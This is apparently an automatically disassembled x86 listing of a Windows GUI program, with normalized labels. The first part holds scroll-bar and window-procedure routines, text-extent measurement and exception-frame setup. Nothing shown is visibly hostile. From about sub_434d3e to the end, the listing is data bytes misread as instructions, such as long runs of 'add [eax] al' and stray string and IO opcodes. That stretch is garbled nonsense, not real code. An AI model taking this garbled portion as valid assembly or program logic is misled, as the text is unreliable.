push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_448484
push eax
call SetScrollPos
jmp r-xdata
sub_43459c
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_448788
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_448484
push eax
call SetScrollInfo
sub_434664
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_434689 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_448484
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_4343e4
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_4038bc
mov edx [ esp ]
mov eax ebx
call sub_434588
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_43478c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_448484
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_4347c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444294
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_441520
mov edx 0x11
mov eax esi
call sub_441544
mov [ esi + 0x209 ] 0x1
mov [ esi + 0x210 ] 0x1
mov eax esi
call sub_434998
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_434838
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4453e0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44530c
mov eax ebx
mov si 0xffc8
call sub_4038bc
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x208 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x100
or eax edx
xor edx edx
mov dl [ ebx + 0x20a ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
and [ edi + 0x24 ] 0xfffffffe
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x80
sub_4348b7
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434945
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43494c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x210 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_441d64
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45925c
test al al
je r-xdata
mov ebx [ ebx + 0x20c ]
mov eax ebx
mov si 0xffb8
call sub_4038bc
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
mov [ edi + 0xc ] 0x1
sub_434998
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_434a70
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x1c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434a77
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404450
retn
cmp [ ebx + 0x209 ] 0x0
je r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_421528
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0xc ]
call sub_4046e4
push eax
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x10 ]
call sub_4048dc
push eax
push esi
call GetTextExtentPoint32A
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
push 0x5
call GetSystemMetrics
shl eax 0x2
add eax [ ebp - 0x8 ]
push eax
push 0x6
call GetSystemMetrics
shl eax 0x2
add eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_434a80
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441234
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
xor eax eax
mov [ edi + 0x20c ] eax
sub_434b18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434b3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434b44
retn
sub_434b50
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434b75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434b7c
retn
sub_434b88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434bad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434bb4
retn
sub_434bc0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434be5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434bec
retn
sub_434bf8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434c1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434c24
retn
sub_434c30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434c55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434c5c
retn
sub_434c98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434cbd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434cc4
retn
sub_434d3e
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ ecx + ebp * 2 + 0x43 ] dl
add [ eax ] al
sub eax 0x6ea40044
inc ebx
add ah cl
sub eax 0x10a80044
inc esp
add ah ch
pop ss
inc esp
add [ eax + 0x17 ] dl
inc esp
add [ eax + 0x20 ] bh
inc esp
add al dh
cmove eax [ eax ]
hlt
sub_43551c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x55
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 2 + 0x559c0043 ] dl
inc ebx
add [ eax + eax ] al
add [ eax + ecx * 2 + 0x41 ] ah
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x68004373 ] bh
imul eax [ ecx ] 0x1c
in eax 0x41
add [ edx + ebp * 2 - 0x1a0bffbf ] al
inc ecx
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax + 0x73 ] ch
inc ebx
add [ ecx ] al
add bh ch
[ eax ]
sub_43565e
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] dh
inc esp
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi * 2 - 0x754fffbd ] bh
inc esp
add [ ebx + edi * 2 + 0x43 ] cl
add [ eax ] bl
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x48 ] 0x79
inc ebx
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add ah dl
jne r-xdata
inc ebx
add [ esi + esi * 2 + 0x43 ] al
add [ eax + 0x76 ] dh
inc ebx
add [ esi + esi * 2 + 0x7a100043 ] al
inc ebx
add [ eax + 0xc004379 ] dh
push esp
inc ebx
jne r-xdata
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ eax - 0x7eabffbc ] al
inc esp
add [ esp + eax * 4 ] al
inc esp
add [ edi + esi * 2 + 0x70043 ] bh
cmp esi [ eax - 0x4fef4fee ]
xor dh [ eax - 0x4fc7ffb9 ]
0x28ff
pop eax
je r-xdata
inc ebx
add [ edi + edx * 2 + 0x43 ] bh
add [ ecx ] al
or [ ebp + 0x78 ] al
je r-xdata
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ eax - 0x7eabffbc ] al
inc esp
add [ esp + eax * 4 ] al
inc esp
add [ edi + esi * 2 + 0x54060043 ] bh
push eax
popad
outsb
insb
nop
les ebx [ eax + 0x43 ]
add [ edi ] al
push es
push esp
push eax
popad
outsb
insb
add [ esi + esi + 0x40 ] dh
add [ eax ] dh
inc esp
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
inc esp
add [ eax + 0x36 ] bl
insd
push eax
popad
outsb
insb
lea eax [ eax ]
adc [ edi + 0x43 ] 0x0
pop es
or al 0x54
inc ebx
jne r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
adc al 0xcd
inc ebx
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
push 0x41
add [ esi + edi ] bh
je r-xdata
add bh bh
jns r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
add [ edx + ebp * 2 + 0x3e3c0041 ] al
insd
push eax
popad
outsb
insb
js r-xdata
add bh bh
cmp [ ecx + 0x43 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
js r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
sub al 0x79
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
add [ eax + eax ] cl
or [ ecx + 0x6c ] eax
add [ eax - 0x3a ] ch
inc ebx
add [ ebx ] bl
add bh bh
js r-xdata
inc eax
inc ebx
add ah al
loope r-xdata
add [ eax ] al
adc [ esi ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
adc eax [ eax ]
or eax [ edx + 0x6f ]
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0xda546564
inc ebx
add [ eax ] bl
add al [ eax ]
inc [ eax + 0x1004379 ]
add [ eax ] al
add [ eax ] al
insb
dec ecx
outsb
outsb
jb r-xdata
insb
imul esp [ edi + 0x6e ] r-xdata
pop ds
add al [ eax ]
jmp [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add al 0x33
inc ecx
add [ edi ] bl
push 0x1c0041e2
cmp [ eax ] eax
cwde
pushad
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
movsb [ edi ] gs : [ esi ]
int3
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
jb r-xdata
add [ eax ] ah
pop ds
inc esp
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax + 0x43050016 ] al
outsd
insb
outsd
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
outsd
outsb
jae r-xdata
inc ebx
jb r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
fiadd [ ebx ]
sbb [ edx ] al
fiadd [ ebx ]
adc al [ edx ]
add bh bh
dec eax
jns r-xdata
inc ecx
adc al 0xe6
inc ebx
je r-xdata
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
jb r-xdata
add bh bh
add al 0x1f
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
pop edi
add [ eax ] al
push [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi * 2 - 0x754fffbd ] bh
inc esp
add [ ebx + edi * 2 + 0x43 ] cl
add [ eax ] bl
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x48 ] 0x79
inc ebx
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add ah dl
jne r-xdata
out 0x41 al
insb
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
test [ eax + eax - 0x18 ] eax
test [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
add [ eax ] al
insb
jb r-xdata
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
insb
dec edi
jne r-xdata
inc eax
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ebx [ eax + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x20004358 ] bh
add al [ eax ]
add [ esi + edx * 2 ] ch
inc ebx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi + 0x18ff0001 ] ah
xchg [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
sbb al 0x2
add bh bh
pushfd
jns r-xdata
jb r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ edx ] bl
add bh bh
sub [ edi ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
fild [ ebx ]
adc al 0x2
add [ ecx ] 0x0
add [ eax ] al
add [ es : esi ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x58ff0000
push ds
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ 0x1dff0002 ] bl
add al [ eax ]
inc [ ecx ]
int3
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push eax
mov [ ebx ] 0x7a
add [ eax ] al
adc [ eax ] al
test al 0x1
add bh bh
les esi [ eax + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + eax ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
xchg [ eax + eax - 0x60 ] al
xchg [ eax + eax + 0x1 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
test eax 0xf4ff0001
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500a00
je r-xdata
outsb
je r-xdata
outsb
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
and [ esi - 0x795fffbc ] al
inc esp
add [ ecx ] al
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
test [ esp + eax * 2 ] bl
add ah bh
cmp eax 0x44
add [ eax + 0x1 ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xc8656c62
rol [ ebx ] cl
rol [ eax ] 0x0
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
sub [ edi ] 0x0
push cs
jpe r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f0a0032 ] al
outsb
js r-xdata
add [ eax ] al
push esp
xor al 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080028 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc esp
jb r-xdata
or al 0xd0
inc ebx
add al ch
push eax
outsd
jo r-xdata
int3
inc edi
je r-xdata
push esp
xor al 0x41
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax ] al
jo r-xdata
js r-xdata
imul esi [ ebp + 0x49 ] 0x786f666e
into
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003a ] al
outsb
dec edi
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
iretd
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ esi ] cl
rol [ ebx ] 0x1
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or cl [ edi + 0x6e ]
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc ebx
add al ah
add [ eax ] al
jmp eax
rol [ ebx ] cl
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ebx ] cl
dec edi
outsb
push ebx
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or ecx [ edi + 0x6e ]
xor al 0x41
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
jo r-xdata
add al ah
popad
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x37ffbc9f ] ch
popad
inc ebx
add [ edx + eax ] ah
jb r-xdata
fmul st6
inc ebx
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax + 0x4f070037 ] al
add [ eax ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
xor al 0x41
add [ eax ] ch
add [ eax ] eax
[ eax ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
rol [ ebx ] 0x1
mov eax 0xb8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
pushad
inc esp
add [ eax + 0x36 ] bl
inc eax
inc ebx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] al
mov ebx es
inc edx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
and al 0x2
inc esp
outsd
arpl [ ebx + 0x58 ] bp
rol [ ebx ] 0x1
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
add al bl
add [ eax ] al
rol [ ebx ] cl
rol [ ecx ] 0x1
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or eax 0x65476e4f
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
xchg esp eax
inc ebx
je r-xdata
add [ esi + esi + 0x40 ] dh
add [ edi + edi * 2 ] ah
inc ebx
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
sbb al 0x39
je r-xdata
loop r-xdata
jb r-xdata
je r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9425e97
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
